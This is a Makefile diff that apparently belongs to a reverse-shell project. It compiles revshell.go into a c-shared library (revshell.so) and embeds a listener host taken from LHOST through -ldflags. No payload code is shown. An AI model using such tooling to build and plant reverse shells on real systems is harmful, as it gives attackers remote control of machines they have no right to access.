@@ -1,8 +1,14 @@
-build: library 
-	gcc -o shell shell.c -ldl
+#module_input and module_output will be set by enviornment variables in future
+module_input = revshell.go
+module_output = revshell.so
+LDFLAGS = "-X 'main.Host=$(LHOST)'"
+PLATFORM = -buildmode=c-shared
 
-library:
-	go build -o revshell.so -buildmode=c-shared revshell.go
+build:
+	go build -o $(module_output) $(PLATFORM) -ldflags $(LDFLAGS) $(module_input)
+
+module:
+	go build -o $(module_output) $(PLATFORM) $(module_input)
 
 clean:
-	rm shell revshell.so revshell.h
+	rm revshell.h
